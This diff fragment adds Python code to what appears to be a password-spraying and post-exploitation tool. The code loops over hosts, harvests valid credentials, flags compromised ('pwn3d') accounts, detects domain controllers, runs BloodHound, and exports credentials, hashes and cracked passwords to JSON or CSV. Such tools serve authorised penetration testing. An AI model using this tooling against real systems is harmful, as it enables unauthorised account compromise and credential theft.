+                        print(header + "\n")
+
+                    if not tasks:
+                        if self.verbosity > V_QUIET:
+                            print(f"  {DIM}── no testable protocols on this host{RESET}\n")
+                        continue
+
+                    if self.scan_only:
+                        continue
+
+                    results = self._collect_target_results(host, tasks, pair_count)
+                    # Wipe the progress bar (stderr) before mixing in stdout output;
+                    # also flush stdout so the per-host summary doesn't interleave
+                    # with the next target's progress bar.
+                    sys.stderr.write("\r" + " " * _term_width() + "\r")
+                    sys.stderr.flush()
+                    sys.stdout.flush()
+
+                    if self.verbosity > V_QUIET:
+                        self._print_target_results(results, tasks)
+                        sys.stdout.flush()
+
+                    # Post-spray analysis: detect DC, harvest valid creds, run enum/modules
+                    self._detect_dc_from_results(host, results, open_ports if self.nmap_enabled else None)
+                    host_valid = self._extract_valid_creds_from_results(host, results)
+                    if host_valid:
+                        self.valid_creds.extend(host_valid)
+                        if self.verbosity == V_QUIET:
+                            for entry in host_valid:
+                                label = self._task_label(entry["protocol"], entry["local_auth"])
+                                if self._is_pwn3d(entry["raw"]):
+                                    print(f"  {RED}{BOLD}💀 {host}{RESET} {BOLD}{label:<20}{RESET} {RED}{entry['raw']}{RESET}")
+                                else:
+                                    print(f"  {GREEN}► {host}{RESET} {BOLD}{label:<20}{RESET} {GREEN}{entry['raw']}{RESET}")
+                        self._post_exploit_host(host, host_valid)
+
+            if self.bloodhound_enabled:
+                self._run_bloodhound_pass()
+
+            if self.export_json_path or self.export_csv_path:
+                self._write_exports()
+
+            self._print_run_diagnostics()
+        finally:
+            if self.cache:
+                self.cache.close()
+
+        if self.strict and self.strict_errors:
+            sys.exit(1)
+
+    def _print_run_diagnostics(self):
+        """End-of-run summary of errors collected during the spray.
+        Always printed when non-empty; in --strict mode the exit code follows."""
+        if not self.strict_errors:
+            return
+        n = len(self.strict_errors)
+        head = f"\n{ICON_WARN} {BOLD}{n} error{'s' if n != 1 else ''} during this run:{RESET}"
+        if self.strict:
+            head += f" {RED}{BOLD}(--strict → exit 1){RESET}"
+        print(head, file=sys.stderr)
+        # Cap at 20 so we don't dump 500 timeouts to the user.
+        for err in self.strict_errors[:20]:
+            print(f"  {DIM}- {err}{RESET}", file=sys.stderr)
+        if n > 20:
+            print(f"  {DIM}... and {n - 20} more{RESET}", file=sys.stderr)
+        print(file=sys.stderr)
+
+    def _write_exports(self):
+        """Persist a structured summary of the run to JSON / CSV."""
+        import csv as _csv
+        import json as _json
+
+        creds_records = []
+        for entry in self.valid_creds:
+            c = entry["credential"]
+            creds_records.append({
+                "host": entry["host"],
+                "protocol": entry["protocol"],
+                "local_auth": entry["local_auth"],
+                "user": c.user,
+                "secret_type": "hash" if c.is_hash else "password",
+                "domain": self.host_domain.get(entry["host"]),
+                "pwn3d": self._is_pwn3d(entry["raw"]),
+                "raw": entry["raw"],
+            })
+
+        if self.export_json_path:
+            doc = {
+                "started_at": self.started_at.isoformat(timespec="seconds"),
+                "finished_at": datetime.now().isoformat(timespec="seconds"),
+                "targets": self.targets,
+                "valid_credentials": creds_records,
+                "domain_controllers": [
+                    {"domain": dom, "hosts": sorted(hs)}
+                    for dom, hs in self.domain_hosts.items()
+                ],
+                "harvested_hashes": self.harvested_hashes,
+                "cracked_credentials": self.cracked_creds,
+                "lockout_warnings": self.lockout_warnings,
+            }
+            self.export_json_path.parent.mkdir(parents=True, exist_ok=True)
+            self.export_json_path.write_text(_json.dumps(doc, indent=2))
+            print(f"  {GREEN}💾 JSON → {self.export_json_path}{RESET}")
+
+        if self.export_csv_path:
+            self.export_csv_path.parent.mkdir(parents=True, exist_ok=True)
+            with open(self.export_csv_path, "w", newline="") as fh:
+                writer = _csv.DictWriter(
+                    fh, fieldnames=["host", "protocol", "local_auth", "user",
+                                    "secret_type", "domain", "pwn3d", "raw"],
+                )
+                writer.writeheader()
+                writer.writerows(creds_records)
+            print(f"  {GREEN}💾 CSV  → {self.export_csv_path}{RESET}")
+
